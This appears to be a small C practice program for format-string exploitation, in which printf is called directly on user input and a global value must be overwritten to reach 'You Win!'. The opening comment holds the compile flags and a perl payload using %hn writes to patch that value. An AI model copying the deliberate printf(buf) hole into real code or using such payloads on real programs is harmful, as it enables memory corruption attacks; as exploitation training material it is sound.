/*
    gcc -m32 -no-pie format_2.c -o format_2
    r <<< `perl -e 'print "\x28\xc0\x04\x08","\x2a\xc0\x04\x08","%36927c%7\\$hn%33520c%8\\$hn"'`
*/

#include <stdio.h>

int answer = 0x31337;

void main(){
    char buf[512] = {0,};
    fgets(buf, 511, stdin);
    printf(buf);
    if(answer == 0x13379047){
        printf("You Win!\n");
    }
}